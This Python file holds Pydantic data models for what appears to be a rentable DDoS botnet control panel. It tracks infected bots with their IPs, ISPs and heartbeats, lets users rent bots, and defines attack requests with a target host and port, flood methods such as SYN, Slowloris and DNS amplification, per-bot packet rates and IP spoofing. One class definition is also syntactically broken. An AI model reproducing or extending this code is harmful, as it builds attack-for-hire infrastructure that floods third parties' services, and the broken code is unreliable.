from pydantic import BaseModel, EmailStr, Field
from typing import Optional, List, Any
from datetime import datetime

class LoginRequest(BaseModel): username: str; password: str
class LoginResponse(BaseModel): access_token: str; token_type: str = "bearer"; user_id: str; role: str
class UserCreate(BaseModel): username: str = Field(..., min_length=3, max_length=64); email: EmailStr; password: str = Field(..., min_length=6)
class UserOut(BaseModel): id: str; username: str; email: str; role: str; is_banned: bool; created_at: Optional[datetime] = None
    class Config: from_attributes = True

class BotOut(BaseModel):
    id: str; bot_identifier: str; nickname: Optional[str]
    ip_address: Optional[str]; country: Optional[str]; isp: Optional[str]
    os_name: Optional[str]; cpu_cores: Optional[int]; ram_total_mb: Optional[int]
    net_speed_mbps: Optional[int]; status: str; is_rented: bool; rented_by_user_id: Optional[str]
    max_pps: int; max_mbps: int; max_threads: int; enabled_methods: List[str]
    spoof_mode: int; fragmentation: bool
    last_heartbeat_at: Optional[datetime]; first_seen_at: Optional[datetime]; bot_version: Optional[str]
    class Config: from_attributes = True

class BotToggle(BaseModel): enabled: bool
class BotAssign(BaseModel): user_id: str; duration_hours: int = 24
class BotThrottle(BaseModel):
    max_pps: Optional[int] = None; max_mbps: Optional[int] = None
    max_threads: Optional[int] = None; enabled_methods: Optional[List[str]] = None
    spoof_mode: Optional[int] = None; fragmentation: Optional[bool] = None

class AttackCreate(BaseModel):
    target_host: str; target_port: int = Field(..., ge=1, le=65535)
    method: str = Field(default="UDP", pattern="^(UDP|TCP|HTTP|SYN|ICMP|MIX|SLOWLORIS|TLS_EXHAUST|DNS_AMP|GAME_MIMIC|MEGA)$")
    duration_secs: int = Field(default=60, ge=1, le=3600)
    pps_per_bot: int = Field(default=100000, ge=1, le=5000000)
    spoof_mode: int = Field(default=0, ge=0, le=2)
    fragmentation: bool = False; slowloris: bool = False; tls_exhaust: bool = False
    dns_amp: bool = False; game_mimic: bool = False; mega_mode: bool = False

class AttackOut(BaseModel):
    id: str; user_id: str; target_host: str; target_port: int
    method: str; duration_secs: int; pps_per_bot: int
    spoof_mode: int; fragmentation: bool; slowloris: bool; tls_exhaust: bool
    dns_amp: bool; game_mimic: bool; mega_mode: bool
    status: str; bot_ids: List[str]; total_packets: int; total_bytes: int
    started_at: Optional[datetime]; completed_at: Optional[datetime]
    class Config: from_attributes = True

class DashboardStats(BaseModel):
    total_bots: int; online_bots: int; rented_bots: int
    active_attacks: int; total_users: int; total_packets: int; total_bandwidth_gb: float

class PaginatedResponse(BaseModel):
    items: List[Any]; total: int; page: int; per_page: int; pages: int